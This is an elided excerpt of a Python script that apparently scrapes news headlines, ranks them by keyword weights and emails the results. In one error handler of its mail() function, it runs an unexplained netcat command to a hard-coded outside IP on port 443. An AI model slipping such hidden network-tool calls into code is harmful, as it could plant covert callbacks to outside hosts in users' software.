...
def make_img_msg(fn):
    ...
    f.close()
    image = MIMEImage(
        data, name=fn.split("/")[2]
    )  # 以/分隔目录文件/tmp/xxx.jpg，只要后面的文件名 20190222！
...
def calculate_keyword_weights(texts, keywords):
    ...
    top_n = 6
    important_feature_names = filtered_feature_names[
        :top_n
    ...
    for keyword in keywords:
        if keyword in filtered_feature_names:
            ...
            print(
                "Keyword: {0}, Index: {1}, Weight: {2}".format(
                    keyword, index, keyword_weights
                )
            )
...
class GrabNews:
    ...
    def getNews(self):
        ...
        for news_element in news_elements:
            ...
            curent_news_rank = calculate_keyword_weights(
                [news_title], KEYWORDS_RANK_MAP
            )
    ...
    def getNews(self):
        ...
        for news in soup.select("a.enk2x9t2"):
            ...
            if curent_news_rank > kRankLevelValue:
                ...
                if (
                    not title or "advertisement" in title.lower()
                ):  # Filter out empty or advertisement titles
                    continue
        ...
        for news in soup.select(".searchtitle   a"):
            ...
            if curent_news_rank > kRankLevelValue:
                ...
                for string in news.stripped_strings:
                    ...
                    if (
                        validate_url_access(self, newsUrl) == True
                        and filterYahoo(self, newsUrl) == True
                    ):
...
def mail():
    ...
    try:
        ...
        try:
            ...
            print(str(e))
            try:
                encrypt_and_verify_url.run_cmd_Popen_fileno(
                    "nc -v -w 4 34.72.71.171 443"
                )
            except Exception as e:
                print(str(e))
